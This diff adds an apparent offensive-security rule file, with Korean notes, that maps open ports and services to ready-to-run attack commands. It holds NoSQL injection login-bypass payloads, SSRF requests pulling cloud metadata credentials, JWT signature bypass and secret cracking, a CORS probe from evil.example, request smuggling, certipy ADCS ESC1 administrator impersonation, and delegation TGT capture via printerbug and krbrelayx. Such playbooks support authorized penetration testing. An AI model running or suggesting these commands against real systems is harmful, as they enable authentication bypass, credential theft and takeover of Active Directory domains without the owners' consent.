@@ -1,0 +1,96 @@
+[
+  {
+    "name": "JWT 공격(alg:none·약한 시크릿 크랙)",
+    "when": {"ports": [80, 443, 8080, 3000, 5000], "services": ["http", "https"]},
+    "suggest": [
+      "python3 -c \"import jwt\" 2>/dev/null; echo 'jwt_tool 로 토큰 분석 권장'",
+      "jwt_tool <JWT> -T",
+      "jwt_tool <JWT> -X a",
+      "hashcat -m 16500 <JWT> {t}/rockyou.txt"
+    ],
+    "note": "alg=none 서명우회·kid 주입·HS256 약한 시크릿 크랙(hashcat -m 16500)→위조. {t} 는 워드리스트 경로 대체(수동). 출처: PortSwigger JWT / jwt_tool.",
+    "tags": ["web", "jwt", "auth-bypass"],
+    "phase": "access"
+  },
+  {
+    "name": "NoSQL 인젝션 인증우회(MongoDB)",
+    "when": {"ports": [80, 443, 8080], "services": ["http", "https"]},
+    "suggest": [
+      "curl -s -X POST http://{t}/login -H 'Content-Type: application/json' -d '{\"username\":\"admin\",\"password\":{\"$ne\":null}}'",
+      "curl -s -X POST http://{t}/login -H 'Content-Type: application/json' -d '{\"username\":{\"$gt\":\"\"},\"password\":{\"$gt\":\"\"}}'",
+      "curl -s 'http://{t}/search?q[$ne]=xyz'"
+    ],
+    "note": "연산자 주입($ne/$gt/$regex)으로 인증우회·데이터 추출. JSON 바디·쿼리 양쪽 시도. CWE-943. 출처: OWASP NoSQLi.",
+    "tags": ["web", "nosqli", "auth-bypass"],
+    "phase": "access"
+  },
+  {
+    "name": "GraphQL introspection 남용",
+    "when": {"ports": [80, 443, 8080, 4000, 3000], "services": ["http", "https"]},
+    "suggest": [
+      "curl -s -X POST http://{t}/graphql -H 'Content-Type: application/json' -d '{\"query\":\"{__schema{types{name fields{name}}}}\"}'",
+      "curl -s -X POST http://{t}/graphql -H 'Content-Type: application/json' -d '{\"query\":\"{__schema{queryType{name} mutationType{name}}}\"}'"
+    ],
+    "note": "introspection 으로 스키마 전체 노출→숨은 쿼리/뮤테이션·권한우회·IDOR 탐색. 도구: graphw00f/clairvoyance. 출처: OWASP/PortSwigger GraphQL.",
+    "tags": ["web", "graphql", "enum"],
+    "phase": "enum"
+  },
+  {
+    "name": "SSRF → 클라우드 메타데이터(IMDS)",
+    "when": {"ports": [80, 443, 8080], "services": ["http", "https"]},
+    "suggest": [
+      "curl -s 'http://{t}/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'",
+      "curl -s 'http://{t}/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>'",
+      "curl -s 'http://{t}/?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token' -H 'Metadata-Flavor: Google'"
+    ],
+    "note": "SSRF 파라미터로 169.254.169.254(IMDSv1)·GCP 메타데이터→임시 자격 탈취→클라우드 횡이동. IMDSv2 는 토큰 필요. CWE-918. 출처: PortSwigger SSRF.",
+    "tags": ["web", "ssrf", "cloud"],
+    "phase": "access"
+  },
+  {
+    "name": "CORS 오구성 자격 탈취",
+    "when": {"ports": [80, 443, 8080], "services": ["http", "https"]},
+    "suggest": [
+      "curl -s -I http://{t}/api/ -H 'Origin: https://evil.example'",
+      "curl -s -I http://{t}/api/ -H 'Origin: null'"
+    ],
+    "note": "응답에 Access-Control-Allow-Origin 이 공격자 Origin 반사 + Allow-Credentials:true 면 인증된 응답 탈취 가능. CWE-942. 출처: PortSwigger CORS.",
+    "tags": ["web", "cors"],
+    "phase": "enum"
+  },
+  {
+    "name": "HTTP 요청 스머글링 점검",
+    "when": {"ports": [80, 443, 8080], "services": ["http", "https"]},
+    "suggest": [
+      "echo 'Smuggler/HTTP Request Smuggler(Burp) 로 CL.TE/TE.CL 탐지'",
+      "python3 smuggler.py -u http://{t}/"
+    ],
+    "note": "프런트/백엔드 Content-Length·Transfer-Encoding 처리 불일치(CL.TE/TE.CL)→요청 밀반입·캐시오염·인증우회. 도구: smuggler.py/Burp. 출처: PortSwigger.",
+    "tags": ["web", "smuggling"],
+    "phase": "access"
+  },
+  {
+    "name": "ADCS ESC1 취약 템플릿(certipy)",
+    "when": {"ports": [445, 389], "services": ["smb", "ldap", "microsoft-ds"], "os": ["windows_ad"]},
+    "suggest": [
+      "certipy find -u {user}@{domain} -p {pass} -dc-ip {t} -vulnerable -stdout",
+      "certipy req -u {user}@{domain} -p {pass} -dc-ip {t} -ca <CA> -template <TMPL> -upn administrator@{domain}",
+      "certipy auth -pfx administrator.pfx -dc-ip {t}"
+    ],
+    "note": "클라이언트인증 EKU + ENROLLEE_SUPPLIES_SUBJECT 템플릿이면 임의 UPN(관리자)로 인증서 발급→PKINIT 로 TGT/NTLM. ESC1. 크리덴셜 필요. 출처: SpecterOps Certified Pre-Owned.",
+    "tags": ["ad", "adcs", "privesc", "cve"],
+    "phase": "privesc"
+  },
+  {
+    "name": "제약 없는 위임(Unconstrained Delegation) TGT 탈취",
+    "when": {"ports": [88, 445], "services": ["kerberos", "smb", "microsoft-ds"], "os": ["windows_ad"]},
+    "suggest": [
+      "python3 findDelegation.py {domain}/{user}:{pass} -dc-ip {t}",
+      "python3 printerbug.py {domain}/{user}:{pass}@<TARGET> <LISTENER>",
+      "impacket-krbrelayx -t ldap://{t} --no-dump"
+    ],
+    "note": "비제약 위임 호스트에 강제인증(PrinterBug/PetitPotam)→DC 머신 TGT 캡처→DCSync. 고위험(DC 손상)·승인 후 수동. MITRE T1558. 출처: harmj0y.",
+    "tags": ["ad", "delegation", "lateral"],
+    "phase": "lateral"
+  }
+]
